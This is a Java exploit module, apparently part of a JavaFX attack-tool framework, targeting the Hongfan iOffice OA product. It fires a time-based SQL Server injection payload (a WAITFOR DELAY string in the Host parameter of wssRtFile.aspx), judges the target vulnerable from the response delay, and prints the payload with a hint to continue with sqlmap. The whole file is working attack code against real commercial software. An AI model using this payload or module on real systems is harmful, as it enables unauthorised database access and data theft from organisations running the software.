package exp.oa.hongfanoa;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools_getTime;

import java.util.HashMap;

public class hongfan_wssRtFile_sqli implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞为sql注入漏洞，无法执行命令");
        });
        return false;
    }
    @Override
    public Boolean checkVulCmd(String url,String cmd ,TextArea textArea, TextArea textArea_cmd) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞为sql注入漏洞，无法执行命令");
        });
        return false;
    }
    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            long var = HttpTools_getTime.get(url + "/iOffice/prg/set/wss/wssRtFile.aspx?Host=1';WAITFOR%20DELAY%20'0:0:3'--" , head, "utf-8");
            if (var > 3000 && var<4000) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ hongfan_wssRtFile_sqli ]");
                    textArea.appendText("\n 利用sqlmap模块进行利用,注入类型:延时注入,sql:sql server");
                    textArea.appendText("\n");
                });

                String target_req = url+"/iOffice/prg/set/wss/wssRtFile.aspx?Host=1';WAITFOR%20DELAY%20'0:0:3'--";
                Platform.runLater(() -> {
                    textArea_cmd.appendText("\n----------------------------------------------------------------------\n"+
                            "\npayload:\n"+target_req +
                            "\n----------------------------------------------------------------------\n"+
                            "\n延时时间: "+var+"毫秒\n----------------------------------------------------------------------\n");
                });

                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
}
